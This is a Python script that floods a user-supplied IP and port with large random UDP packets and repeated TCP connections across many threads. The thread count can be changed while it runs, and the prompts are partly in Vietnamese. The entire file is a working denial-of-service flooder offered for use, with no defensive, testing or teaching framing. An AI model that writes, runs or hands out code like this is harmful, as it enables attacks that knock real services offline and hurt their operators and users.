import threading
import time
import socket
import random
import os
from colorama import Fore, Style, init

init(autoreset=True)

COLORS = [Fore.RED, Fore.YELLOW]

os.system('cls' if os.name == 'nt' else 'clear')

ip = input(f'{Fore.GREEN}IP    : ')
port = int(input(f'{Fore.GREEN}Port  : '))
num_threads = int(input(f'{Fore.GREEN}Threads : '))

udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_bytes = random._urandom(65507) 

tcp_bytes = random._urandom(65507)

running_threads = []
lock = threading.Lock()
stop_event = threading.Event()

def send_udp_packets():
    color_index = 0
    global udp_sock, udp_bytes, ip, port
    while not stop_event.is_set():
        udp_sock.sendto(udp_bytes, (ip, port))
        color = COLORS[color_index % len(COLORS)]
        print(f"{color}Sent UDP packet to {ip}:{port}, AnhThinhDepTrai6Mui")
        time.sleep(0.1)

def send_tcp_packets():
    color_index = 0
    global ip, port, tcp_bytes
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_sock:
                tcp_sock.connect((ip, port))
                tcp_sock.send(tcp_bytes)
                color = COLORS[color_index % len(COLORS)]
                print(f'{color}Sent TCP packet to {ip}:{port}, AnhThinhDepTrai6Mui')
                time.sleep(0.1)
        except Exception as e:
            print(f'{color}Error in TCP connection: {e}')
            time.sleep(0.1)

def manage_threads():
    global num_threads
    while True:
        action = input("Nhập số lượng luồng mới (hoặc 0 để giữ nguyên): ")
        try:
            new_thread_count = int(action)
            if new_thread_count >= 0:
                with lock:
                    diff = new_thread_count - num_threads
                    if diff > 0:
                        for _ in range(diff):
                            thread = threading.Thread(target=send_udp_packets, name="UDP")
                            thread.start()
                            running_threads.append(thread)
                            thread = threading.Thread(target=send_tcp_packets, name="TCP")
                            thread.start()
                            running_threads.append(thread)
                        print(f"Tăng số lượng luồng lên {new_thread_count}.")
                    elif diff < 0:
                        for _ in range(-diff):
                            stop_event.set()
                            if running_threads:
                                thread = running_threads.pop()
                                thread.join()
                        stop_event.clear()
                        print(f"Giảm số lượng luồng xuống {new_thread_count}.")
                    
                    num_threads = new_thread_count
            else:
                print("Số lượng luồng không thể âm.")
        except ValueError:
            print("Vui lòng nhập một số hợp lệ.")

for _ in range(num_threads):
    thread = threading.Thread(target=send_udp_packets, name="UDP")
    thread.start()
    running_threads.append(thread)
    
    thread = threading.Thread(target=send_tcp_packets, name="TCP")
    thread.start()
    running_threads.append(thread)

manage_thread = threading.Thread(target=manage_threads)
manage_thread.start()

for thread in running_threads:
    thread.join()